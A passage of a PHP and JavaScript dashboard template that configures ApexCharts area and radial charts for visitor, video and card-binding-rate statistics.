          filter: {
            type: 'none'
          }
        }
      }
    };
  if (typeof totalRevenueChartEl !== undefined && totalRevenueChartEl !== null) {
    const totalRevenueChart = new ApexCharts(totalRevenueChartEl, totalRevenueChartOptions);
    totalRevenueChart.render();
  }

</script>

<script>

// Income Chart - Area chart
  // --------------------------------------------------------------------
  const incomeChartEl = document.querySelector('#incomeChart'),
    incomeChartConfig = {
      series: [
        {
          data: [10, <?php echo $daily_video_statastic_count; ?>]
        }
      ],
      chart: {
        height: 215,
        parentHeightOffset: 0,
        parentWidthOffset: 0,
        toolbar: {
          show: false
        },
        type: 'area'
      },
      dataLabels: {
        enabled: false
      },
      stroke: {
        width: 2,
        curve: 'smooth'
      },
      legend: {
        show: false
      },
      markers: {
        size: 6,
        colors: 'transparent',
        strokeColors: 'transparent',
        strokeWidth: 4,
        discrete: [
          {
            fillColor: config.colors.white,
            seriesIndex: 0,
            dataPointIndex: 7,
            strokeColor: config.colors.primary,
            strokeWidth: 2,
            size: 6,
            radius: 8
          }
        ],
        hover: {
          size: 7
        }
      },
      colors: [config.colors.primary],
      fill: {
        type: 'gradient',
        gradient: {
          shade: shadeColor,
          shadeIntensity: 0.6,
          opacityFrom: 0.5,
          opacityTo: 0.25,
          stops: [0, 95, 100]
        }
      },
      grid: {
        borderColor: borderColor,
        strokeDashArray: 3,
        padding: {
          top: -20,
          bottom: -8,
          left: -10,
          right: 8
        }
      },
      xaxis: {
        categories: ['', <?php echo $daily_video_statistic ?>],
        axisBorder: {
          show: false
        },
        axisTicks: {
          show: false
        },
        labels: {
          show: true,
          style: {
            fontSize: '13px',
            colors: axisColor
          }
        }
      },
      yaxis: {
        labels: {
          show: false
        },
        /*min: 10,
        max: 50,
        tickAmount: 4*/
      }
    };
  if (typeof incomeChartEl !== undefined && incomeChartEl !== null) {
    const incomeChart = new ApexCharts(incomeChartEl, incomeChartConfig);
    incomeChart.render();
  }

</script>
<script>


  // Expenses Mini Chart - Radial Chart
  // --------------------------------------------------------------------
  const weeklyExpensesEl = document.querySelector('#expensesOfWeek'),
    weeklyExpensesConfig = {
      series: [<?php echo $total_user_with_card_visitor_wise; ?>],
      chart: {
        width: 60,
        height: 60,
        type: 'radialBar'
      },
      plotOptions: {
        radialBar: {
          startAngle: 0,
          endAngle: 360,
          strokeWidth: '8',
          hollow: {
            margin: 2,
            size: '45%'
          },
          track: {
            strokeWidth: '50%',
            background: borderColor
          },
          dataLabels: {
            show: true,
            name: {
              show: false
            },
            value: {
              formatter: function (val) {
                return '' + parseInt(val);
              },
              offsetY: 5,
              color: '#697a8d',
              fontSize: '13px',
              show: true
            }
          }
        }
      },
      fill: {
        type: 'solid',
        colors: config.colors.primary
      },
      stroke: {
        lineCap: 'round'
      },
      grid: {
        padding: {
          top: -10,
          bottom: -15,
          left: -10,
          right: -10
        }
      },
      states: {
        hover: {
          filter: {
            type: 'none'
          }
        },
        active: {
          filter: {
            type: 'none'
          }
        }
      }
    };
  if (typeof weeklyExpensesEl !== undefined && weeklyExpensesEl !== null) {
    const weeklyExpenses = new ApexCharts(weeklyExpensesEl, weeklyExpensesConfig);
    weeklyExpenses.render();
  }

</script>
<?php

$count_percentage_of_visotor_vs_form_fill = round(($total_form_received*100)/$total_visitor_count);

?>
<script>
  // Growth Chart - Radial Bar Chart
  // --------------------------------------------------------------------
  const growthChartEl = document.querySelector('#growthChart'),
    growthChartOptions = {
      series: [<?php echo $count_percentage_of_visotor_vs_form_fill ?>],
      labels: ['绑卡率'],
      chart: {
        height: 240,
        type: 'radialBar'
      },
      plotOptions: {
        radialBar: {
          size: 150,
          offsetY: 10,
          startAngle: -150,
          endAngle: 150,
          hollow: {
            size: '55%'
          },
          track: {
            background: '#faebd703',
            strokeWidth: '100%'
          },
          dataLabels: {
            name: {
              offsetY: 15,
              color: headingColor,
              fontSize: '15px',
              fontWeight: '600',
              fontFamily: 'Public Sans'
            },
            value: {
              offsetY: -25,
              color: headingColor,
              fontSize: '22px',
              fontWeight: '500',
              fontFamily: 'Public Sans'
            }
          }
        }
      },
      colors: [config.colors.primary],
      fill: {
        type: 'gradient',
        gradient: {
          shade: 'dark',
          shadeIntensity: 0.5,
          gradientToColors: [config.colors.primary],
          inverseColors: true,
          opacityFrom: 1,
          opacityTo: 0.6,
          stops: [30, 70, 100]
        }
      },
      stroke: {
        dashArray: 5
      },
      grid: {
        padding: {
          top: -35,
          bottom: -10
        }
      },
      states: {
        hover: {
          filter: {
            type: 'none'
          }
        },
        active: {
          filter: {
            type: 'none'
          }
        }
      }
    };
  if (typeof growthChartEl !== undefined && growthChartEl !== null) {
    const growthChart = new ApexCharts(growthChartEl, growthChartOptions);
    growthChart.render();
  }
</script>
  </body>
</html>
